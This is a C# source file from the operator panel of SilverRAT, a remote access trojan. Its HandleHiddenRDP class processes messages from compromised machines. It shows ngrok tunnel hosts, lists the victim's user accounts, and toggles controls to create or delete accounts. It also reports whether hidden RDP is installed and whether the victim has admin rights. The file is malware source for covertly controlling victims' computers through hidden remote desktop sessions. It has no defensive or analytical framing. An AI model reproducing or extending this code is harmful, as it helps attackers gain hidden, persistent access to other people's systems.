using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.MessagePack;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleHiddenRDP
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "HostNagrok":
                    {
                        HiddenRDP hiddenRDP3 = (HiddenRDP)Application.OpenForms["HRDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenRDP3 != null)
                        {
                            string asString = unpack_msgpack.ForcePathObject("Host").AsString;
                            if (!string.IsNullOrEmpty(asString))
                            {
                                hiddenRDP3.HostNagrok.Text = asString;
                                hiddenRDP3.LogsNagrok.ForeColor = Color.LimeGreen;
                            }
                            else
                            {
                                hiddenRDP3.HostNagrok.Text = "Connection failed, try again";
                                hiddenRDP3.LogsNagrok.ForeColor = Color.LimeGreen;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "ListUsers":
                    {
                        HiddenRDP hiddenRDP7 = (HiddenRDP)Application.OpenForms["HRDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenRDP7 != null)
                        {
                            hiddenRDP7.ListAllUsernsmr.Items.Clear();
                            string asString2 = unpack_msgpack.ForcePathObject("Acount").AsString;
                            string[] array = asString2.Split(new string[1] { "-==>" }, StringSplitOptions.None);
                            int num;
                            for (num = 0; num <= array.Length - 1; num++)
                            {
                                if (array[num].Length > 0)
                                {
                                    string text = array[num];
                                    string text2 = array[num + 1];
                                    bool flag5 = bool.Parse(array[num + 2]);
                                    ListViewItem listViewItem = new ListViewItem
                                    {
                                        Text = text
                                    };
                                    listViewItem.SubItems.Add(text2);
                                    if (flag5)
                                    {
                                        listViewItem.SubItems.Add("Active");
                                        listViewItem.ForeColor = Color.Green;
                                    }
                                    else
                                    {
                                        listViewItem.SubItems.Add("Inactive");
                                        listViewItem.ForeColor = Color.Red;
                                    }
                                    hiddenRDP7.ListAllUsernsmr.Items.Insert(0, listViewItem);
                                }
                                num += 2;
                            }
                            if (hiddenRDP7.CreateAccount.Text != "Create")
                            {
                                hiddenRDP7.CreateAccount.Text = "Create";
                            }
                            if (!hiddenRDP7.CreateAccount.Enabled)
                            {
                                hiddenRDP7.CreateAccount.Enabled = true;
                            }
                            if (hiddenRDP7.DeleteAccount.Text != "Delete")
                            {
                                hiddenRDP7.DeleteAccount.Text = "Delete";
                            }
                            if (!hiddenRDP7.DeleteAccount.Enabled)
                            {
                                hiddenRDP7.DeleteAccount.Enabled = true;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "ConnectNagrok":
                    {
                        HiddenRDP hiddenRDP2 = (HiddenRDP)Application.OpenForms["HRDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenRDP2 != null)
                        {
                            bool flag2 = bool.Parse(unpack_msgpack.ForcePathObject("State").AsString);
                            hiddenRDP2.ConnectNagrok.Enabled = true;
                            if (flag2)
                            {
                                hiddenRDP2.ConnectNagrok.Text = "Disconnected";
                                hiddenRDP2.LogsNagrok.ForeColor = Color.LimeGreen;
                            }
                            else
                            {
                                hiddenRDP2.ConnectNagrok.Text = "Connect";
                                hiddenRDP2.LogsNagrok.ForeColor = Color.DarkRed;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "LogsInstall":
                    {
                        HiddenRDP hiddenRDP5 = (HiddenRDP)Application.OpenForms["HRDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenRDP5 != null)
                        {
                            bool flag4 = bool.Parse(unpack_msgpack.ForcePathObject("State").AsString);
                            hiddenRDP5.LogsInstallRDP.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            hiddenRDP5.guna2GradientButton_0.Enabled = true;
                            if (flag4)
                            {
                                hiddenRDP5.LogsInstallRDP.ForeColor = Color.LimeGreen;
                            }
                            else
                            {
                                hiddenRDP5.LogsInstallRDP.ForeColor = Color.DarkRed;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "LogsNagrok":
                    {
                        HiddenRDP hiddenRDP4 = (HiddenRDP)Application.OpenForms["HRDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenRDP4 != null)
                        {
                            bool flag3 = bool.Parse(unpack_msgpack.ForcePathObject("State").AsString);
                            hiddenRDP4.LogsNagrok.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            if (flag3)
                            {
                                hiddenRDP4.LogsNagrok.ForeColor = Color.LimeGreen;
                            }
                            else
                            {
                                hiddenRDP4.LogsNagrok.ForeColor = Color.DarkRed;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        HiddenRDP hiddenRDP6 = (HiddenRDP)Application.OpenForms["HRDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenRDP6 != null)
                        {
                            if (hiddenRDP6.Client == null)
                            {
                                hiddenRDP6.Client = client;
                                hiddenRDP6.LoaderConnect.Visible = false;
                                hiddenRDP6.Timer1.Start();
                                hiddenRDP6.Admin = bool.Parse(unpack_msgpack.ForcePathObject("Admin").AsString);
                                if (bool.Parse(unpack_msgpack.ForcePathObject("ChackRDP").AsString))
                                {
                                    hiddenRDP6.guna2GradientButton_0.Text = "Uninstall";
                                    hiddenRDP6.LogsInstallRDP.ForeColor = Color.LimeGreen;
                                    hiddenRDP6.LogsInstallRDP.Text = "Installed";
                                }
                                else
                                {
                                    hiddenRDP6.guna2GradientButton_0.Text = "Install";
                                    hiddenRDP6.LogsInstallRDP.ForeColor = Color.DarkRed;
                                    hiddenRDP6.LogsInstallRDP.Text = "Not Installed";
                                }
                                if (bool.Parse(unpack_msgpack.ForcePathObject("ngrok").AsString))
                                {
                                    hiddenRDP6.ConnectNagrok.Text = "Disconnected";
                                    hiddenRDP6.LogsNagrok.ForeColor = Color.LimeGreen;
                                }
                                else
                                {
                                    hiddenRDP6.ConnectNagrok.Text = "Connect";
                                    hiddenRDP6.LogsNagrok.ForeColor = Color.DarkRed;
                                }
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "InstallRDP":
                    {
                        HiddenRDP hiddenRDP = (HiddenRDP)Application.OpenForms["HRDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenRDP != null)
                        {
                            bool flag = bool.Parse(unpack_msgpack.ForcePathObject("State").AsString);
                            hiddenRDP.guna2GradientButton_0.Enabled = true;
                            if (flag)
                            {
                                hiddenRDP.guna2GradientButton_0.Text = "Uninstall";
                                hiddenRDP.LogsInstallRDP.ForeColor = Color.LimeGreen;
                                hiddenRDP.LogsInstallRDP.Text = "Installed";
                            }
                            else
                            {
                                hiddenRDP.guna2GradientButton_0.Text = "Install";
                                hiddenRDP.LogsInstallRDP.ForeColor = Color.DarkRed;
                                hiddenRDP.LogsInstallRDP.Text = "Not Installed";
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
